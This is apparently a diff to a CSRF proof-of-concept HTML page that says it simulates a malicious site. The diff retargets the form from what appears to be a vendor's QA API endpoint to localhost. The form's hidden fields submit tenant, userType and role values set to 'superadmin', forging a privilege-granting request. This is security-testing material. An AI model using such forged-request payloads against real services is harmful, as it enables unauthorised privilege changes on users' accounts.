@@ -10,7 +10,7 @@
 <p>This simulates a malicious site attempting to trigger a request.</p>
 
 <h2>1️⃣ QA Environment (No CSRF Token)</h2>
-<form action="https://grow-qa.fareye.io/api/tenant/v1/merchants/testroute" method="POST">
+<form action="http://localhost/api/tenant/v1/merchants/testroute" method="POST">
   <input type="hidden" name="tenant" value="couriersplease">
   <input type="hidden" name="userType" value="superadmin">
   <input type="hidden" name="role" value="superadmin">
